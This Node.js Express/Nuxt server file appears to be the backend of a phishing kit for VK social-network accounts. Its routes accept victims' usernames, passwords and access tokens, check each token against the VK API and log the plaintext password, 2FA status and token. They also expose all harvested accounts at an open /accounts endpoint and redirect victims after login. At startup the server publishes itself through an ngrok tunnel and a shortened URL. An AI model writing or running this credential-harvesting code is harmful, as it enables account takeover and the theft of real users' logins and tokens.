const express = require('express')
const consola = require('consola')
const { Nuxt, Builder } = require('nuxt')
const app = express()
const bodyParser = require('body-parser')
const config = require('../nuxt.config.js')
const ngrok = require('./ngrok')

// Import and Set Nuxt.js options
config.dev = process.env.NODE_ENV !== 'production'

const { getShortUrl, afterLogin } = require('./aye-kosmonavt-yaml')
const userbot = require('./userbot').default
const API = require('./vkapi')

async function start() {
  // Init Nuxt.js

  const nuxt = new Nuxt(config)
  const accounts = []

  const { host, port } = nuxt.options.server

  // Build only in dev mode
  if (config.dev) {
    const builder = new Builder(nuxt)
    await builder.build()
  } else {
    await nuxt.ready()
  }

  // Give nuxt middleware to express

  app.post('/auth', bodyParser.json(), (req, res) => {
    userbot(req.body).then((json) => res.json(json))
  })

  app.post('/done', bodyParser.json(), (req, res) => {
    const api = new API(req.body.token, 5.103)

    api.userAgent = req.headers['user-agent'] || 'vkApi/1.0'

    api.call('users.get').then(([currentUser]) => {
      accounts.push({ ...currentUser, ...req.body })

      consola.info({ message: 'Got new account', badge: true })
      consola.info(`Name: ${currentUser.first_name} ${currentUser.last_name}`)
      consola.info(`Login: ${req.body.username}`)
      consola.info(`Password: ${req.body.password}`)
      if (req.body['2fa']) {
        consola.error('2fa: Enabled')
      } else {
        consola.success('2fa: Disabled')
      }
      consola.info(`Token: ${req.body.token}`)
    })

    res.end('ok')
  })

  app.get('/accounts', (_uReq, res) => {
    res.header('Access-Control-Allow-Origin', '*')

    res.json({ accounts })
  })

  app.get('/exit', async (_uReq, res) => res.redirect(await afterLogin()))

  app.use(nuxt.render)

  // Listen the server
  app.listen(port, host)

  consola.ready({
    message: `Server listening on http://${host}:${port}`,
    badge: true
  })

  consola.info(`Admin started: http://${host}:${port}/admin/`)

  // if (!config.dev) {
  try {
    const publicUrl = await ngrok(port)

    consola.info(`Listening public url: ${publicUrl}`)

    const shortUrl = await getShortUrl(publicUrl)

    consola.info(`Shorten url is: ${shortUrl}`)
  } catch (e) {
    consola.error(e)
  }
  // }
}

start()

process
  .on('unhandledRejection', (reason, p) => {
    console.error(reason, 'Unhandled Rejection at Promise', p)
  })
  .on('uncaughtException', (err) => {
    console.error(err, 'Uncaught Exception thrown')
    process.exit(1)
  })
